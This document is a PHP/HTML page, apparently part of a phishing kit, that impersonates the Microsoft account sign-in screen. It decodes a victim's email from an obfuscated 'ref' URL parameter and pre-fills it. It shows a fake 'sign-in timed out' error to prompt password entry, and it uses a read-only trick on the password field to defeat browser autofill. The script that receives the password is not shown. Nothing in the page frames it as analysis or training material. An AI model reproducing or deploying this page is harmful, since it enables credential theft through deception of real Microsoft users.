<?php
require_once 'hostname.php';

$mail = $_GET['ref'];

 
function doEncrypt($mail)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($mail)."";
	return $crystr;
}

function doDecrypt($mail)
{
	$str = substr($mail, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

?>
<html>
    <head>
        <title>Sign In to your Microsoft Account</title>
        <link rel="icon" type="image/x-icon" href="officon.png">
               <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="style.css">
    <script src="script.js"></script>   

       
</head>
    <body class="formbod">
        <form>      
            <div class="boxing" id="boxing" >
            <img id="logo" src="offlogo.png">
                <div >  
			<a href="#"> <img id="offbackbtn" src="off-backicon.png"></a>         
          <input type="email" name="email" id="email" value="<?php echo doDecrypt($mail); ?>"  placeholder="" readonly size="35" >
        <div class="form-outline">
        <h4 class="entpass">Enter password</h4>
        <span id="error">Sorry, your sign-in timed out. Please sign in again.</span>
           <div class="form-group">
            <input name="pass" id="pass" value="" type="password" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly');" placeholder="Password" autofocus="autofocus">
            <p><a href="#">Forgot password?</a></p></div>
            <div class="form-group">
        <button type="submit" class="btn float-right" style=" font-size:14.5px;">Sign In</button>
            </div>
        </div>
</div>
    </div>
    <div class="footer"> 
        <p>. . .</p>
        <p>Privacy & cookies</p>
        <p>Terms of use</p>
    </div>       
    
        </form>
        
    </body>
</html>
